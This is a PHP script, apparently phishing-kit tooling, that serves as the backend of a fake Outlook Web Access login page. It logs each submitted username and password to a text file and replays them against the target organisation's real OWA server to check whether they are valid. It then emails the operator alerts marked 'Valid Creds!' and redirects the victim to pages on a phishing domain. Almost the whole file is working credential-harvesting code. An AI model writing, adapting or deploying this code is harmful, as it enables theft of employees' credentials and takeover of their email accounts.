<?php
/*
 YOU MUST CONFIGURE THE FOLLOWING 
 -----------------------------------------------------
*/

$domain = "NTDOMAIN";
$host = "owa-server.target.com";

// IF we obtain  
$REDIRECT_SUCCESS = "https://PHISHING_DOMAIN/portal.html";
$REDIRECT_FAILURE = "https://PHISHING_DOMAIN/login.html";

// Email alerts of successful logins
$fromaddress = "owa@yourdomain.com";
$recipient = "user@email.com,1235551212@vtext.com";
$emailSubject = "OWA Portal Login";

//$username = "TESTUSER";
//$pass = "TESTPASS";
/*
-------------------------------------------------------
*/




$postuser = $_POST['username'];
$pass = $_POST['password'];

#echo "user is $user pass is $pass";
file_put_contents("phish_info_out.txt", "$user:$pass\n", FILE_APPEND);

$user = "$domain\\$postuser";

$postData = array('destination'   => "https://$host/owa",
				 'flags' => '0',
				 'forcedownlevel' => '0',
				 'trusted' => '0',
				 'username' => "$user",
				 'password' => "$pass",
				 'isUtf8' => '1'
);


$headers = array (
 'application/x-www-form-urlencoded'
);

/*

 To correctly authenticate we need to first make a 'dumby' connection
 to get the session variables and store in a cookie. If you dont then
 the server will know its not a valid connection and fail even with
 correct credentials - TBW

*/

$tmp = sys_get_temp_dir();

$owaurl = "https://$host/owa";
$authurl = 'https://$host/owa/auth.owa';

$cookie = "$tmp/$username.cookie.txt";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $owaurl);
curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt( $ch, CURLOPT_COOKIEJAR, $cookie );
$res  = curl_exec($ch);

curl_setopt ($ch, CURLOPT_URL, $authurl);
curl_setopt ($ch, CURLOPT_POST, true);
curl_setopt ($ch, CURLOPT_REFERER, "https://$host/owa/auth/logon.aspx?replaceCurrent=1&reason=2&url=https%3a%2f%2f$host%2fowa%2f");
curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($postData) );
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, true);
//curl_setopt ($ch, CURLOPT_COOKIESESSION, true);
//curl_setopt ($ch, CURLOPT_COOKIEJAR, "$user.cookie.txt" );
curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie );  
curl_setopt ($ch, CURLOPT_COOKIE, "PBACK=0");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers );
$res = curl_exec($ch);

  if ( true) {
    $ret = 0; // default case to succeed and claim user logged in correctly

    if ( preg_match ( '/Your account has expired. Please contact technical support for your organization./', $res )) {
      $ret = 1; $msg = "Login Failed - Account has expired.";
    }

    elseif (preg_match ( '/The user name or password you entered isn\'t correct. Try entering it again./', $res)) {
     $ret = 1; $msg = "Failed (user name or password invalid)";
    }
    elseif (preg_match ( '/Login Failed - Invalid ID or Password/', $res)) {
      $ret = 1; $msg = "Failed (Invalid ID or Password...)";
    }
    elseif (preg_match ( '/The user name or password that you entered is not valid. Try entering it again./', $res)) {
      $ret = 1; $msg = "Failed (user name or password invalid)";
    }
    elseif  ( preg_match( '/could not find a mailbox for (.*?)\./', $res))
    { 
       $ret = 0;
       $msg = "*** SUCCESS: Valid password, but no mailbox for: $user ***";
    }
    elseif  (preg_match(' /couldn\'t be found for (.*?)\./', $res)) {
       $ret = 0;
       $msg = "*** SUCCESS: Valid password, but no mailbox for: $1 ***";
    }

  //else { $msg = " (CODE:" . $res->code . " : " . $res->message . ") "; $ret = 0; }
  }
#echo "User: $user\n<br>Msg: $msg\n";

if ( $ret == '0' )
{
 //success
 send_mail("Valid Creds! - OWA", $username);
 header( "Location: $REDIRECT_SUCCESS" ) ;

}

if ( $ret == '1' )
{
 //failure
 send_mail("Fail Login - OWA", $username);
 header( "Location: $REDIRECT_FAILURE" ) ;
}


function send_mail( $subject, $user )
{
  global $fromaddress;
  global $recipient;
  global $emailSubject;

  $srcip = $_SERVER['REMOTE_ADDR'];
  $eol="\r\n";
  $headers = "From: $fromaddress".$eol;
  $message = "
  Source: $srcip
  Name: $user
  ";

  $ret = mail ( $recipient  ,  $emailSubject  ,  $message, $headers  );

  #echo "mail said $ret<br>";
  #echo "recipient: $recipient<br>subject: $subject<br>Message: $message<br>Headers: $headers<br>";
}

?>
